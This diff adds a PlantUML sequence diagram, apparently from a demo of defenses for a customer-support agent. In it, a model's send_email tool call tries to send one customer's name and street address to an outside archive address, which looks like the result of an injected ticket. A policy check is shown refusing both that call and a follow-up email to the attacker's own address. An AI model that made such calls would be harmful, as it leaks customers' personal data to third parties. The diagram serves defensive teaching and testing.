@@ -1,0 +1,56 @@
+@startuml
+title Example 5 - Level 3: the summary is emailed to an outside address
+hide footbox
+skinparam backgroundColor white
+skinparam defaultFontName Arial
+skinparam defaultFontSize 12
+skinparam shadowing false
+skinparam ArrowColor #1F4E79
+skinparam participant {
+  BackgroundColor #F2F6FA
+  BorderColor #1F4E79
+}
+skinparam actor {
+  BackgroundColor #FFF3E0
+  BorderColor #1F4E79
+}
+skinparam sequence {
+  LifeLineBorderColor #1F4E79
+  GroupBorderColor #1F4E79
+  GroupHeaderFontColor #1F4E79
+}
+skinparam note {
+  BackgroundColor #FFFDE7
+  BorderColor #9E9D24
+}
+actor "Support agent\n(presenter)" as P
+participant "ShopDeskAgent\nagent.py" as A
+participant "Defense\ndefense.py" as D #E8F5E9
+participant "LLM" as M
+participant "tools/impl.py\nsend_email()" as TL
+participant "store.py\nemails (outbox)" as DB
+M --> A : tool_use send_email(to="records@shopdesk-archive.example",\nsubject="Ticket summary", body="... Dana Whitfield, 812 Larkspur Ct ...")
+alt DEFENSE OFF
+  A -> D : check_tool_call(send_email)
+  D --> A : allow
+  A -> TL : _execute()
+  TL -> DB : log_email(to, subject, body)
+  TL --> P : trace: "SIMULATED send_email -> records@shopdesk-archive.example"\nside panel: outbox entry
+else DEFENSE ON
+  A -> D : check_tool_call(send_email)
+  D -> D : _policy(): not a ticket sender in this run (scope.senders)\nand AllowList.allows() is false (staff domain shopdesk.example)
+  D --> A : refuse
+  A --> P : trace: "REFUSED send_email: recipient ... did not send a ticket in this run\nand is not an approved staff address"  rule: reply only to the ticket's own sender
+  opt the model emails the T4 sender instead: chris.lindqvist@example.org
+    A -> D : check_tool_call(send_email, body with Dana's address)
+    D -> D : _other_customers_in(body): 812 Larkspur Ct -> Dana Whitfield
+    D --> A : refuse - rule: never send one customer's data to another
+    A -> D : check_tool_call(send_email, clean "sorry about the scratch")
+    D --> A : approve -> Approve / Deny box shows the full body
+  end
+end
+note over D, TL
+  Recipients come from the run's scope, not from "any customer on file".
+  The body check is what stops the attacker - who did send a ticket - from receiving Dana's details.
+end note
+@enduml
